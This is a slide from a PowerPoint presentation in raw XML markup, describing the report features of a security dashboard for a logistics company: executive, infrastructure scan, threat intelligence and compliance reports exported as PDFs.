            <a:srgbClr val="05150F"/>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65760" y="6190488"/>
            <a:ext cx="11457432" cy="384047"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Auto-evaluation trigger: every time a CVE is patched, an asset scan completes, or an incident is resolved, the affected controls are automatically re-evaluated. A control that was failing because of CVE-2021-44228 will turn green immediately when the patch is merged and the re-simulation returns BLOCKED. This means the compliance score improves in real time as the team remediates — providing continuous assurance rather than point-in-time snapshots. Audit-ready PDF export available in one click.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Reports</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Four live-data report types — executive summary · infrastructure scan · threat intel · compliance PDF</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1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Reports page is where GlobalShip Logistics' security programme gets packaged for stakeholders. It generates four distinct report types, each pulling live data from Supabase at the moment of generation — so there is no stale data, no manual copy-paste from spreadsheets, and no version control problem. Reports are exportable as PDF. The page also contains three Demo Seeding buttons that populate the entire platform with realistic logistics data in one click — useful for resetting the demo environment or loading fresh data after clearing the database.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2121408"/>
            <a:ext cx="2880360" cy="3913632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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21408"/>
            <a:ext cx="2880360"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2194560"/>
            <a:ext cx="2880360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>📊</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2743200"/>
            <a:ext cx="2660904" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security Executive
Report</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3236976"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ●  Who it's for: CISO, board, steering committee</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3474720"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Overall security score with 30-day trend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3712464"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Top 5 CVEs by exploit priority (EPSS-ranked)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3950208"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Incident summary: MTTR, SLA compliance rate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4187952"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Compliance scorecard across all frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4425696"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Dark web threat summary with threat actor list</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4663440"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Top 5 recommended actions with owner and deadline</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="5760720"/>
            <a:ext cx="2660904" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="07171F"/>
          </a:solidFill>
          <a:ln w="508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8328" y="5779008"/>
            <a:ext cx="2660904" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⬇  Generate &amp; Download PDF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2121408"/>
            <a:ext cx="2880360" cy="3913632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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0" y="2121408"/>
            <a:ext cx="2880360" cy="54864"/>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2194560"/>
            <a:ext cx="2880360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🖥</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="2743200"/>
            <a:ext cx="2660904" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Infrastructure Scan
Report</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3236976"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ●  Who it's for: infrastructure team, architects</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3474720"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Full asset inventory with last scan dates</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3712464"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Open port map per service with CVE matches</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="TextBox 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3950208"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  OS and software version inventory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="4187952"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Criticality heat map by asset category</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="4425696"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Unpatched asset list sorted by risk score</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="4663440"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Network segment boundary analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5760720"/>
            <a:ext cx="2660904" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F1704"/>
          </a:solidFill>
          <a:ln w="508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10128" y="5779008"/>
            <a:ext cx="2660904" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⬇  Generate &amp; Download PDF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2121408"/>
            <a:ext cx="2880360" cy="3913632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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72200" y="2121408"/>
            <a:ext cx="2880360" cy="54864"/>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2194560"/>
            <a:ext cx="2880360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="2400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🌐</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="2743200"/>
            <a:ext cx="2660904" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat Intelligence
Report</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3236976"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ●  Who it's for: threat analysts, SOC team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3474720"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  CVE trend — new CVEs added in last 30 days</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3712464"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  EPSS top-10 ranked exploit probability table</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3950208"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  CISA KEV watchlist — new additions this month</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="4187952"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  New MITRE ATT&amp;CK techniques observed in simulations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="4425696"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Dark web intelligence summary by category</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="4663440"/>
            <a:ext cx="2697480" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ▸  Threat actor activity bulletin</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Rectangle 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="5760720"/>
            <a:ext cx="2660904" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F0E0E"/>
          </a:solidFill>
          <a:ln w="508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81928" y="5779008"/>
            <a:ext cx="2660904" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⬇  Generate &amp; Download PDF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Rectangle 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="2121408"/>
            <a:ext cx="2880360" cy="3913632"/>
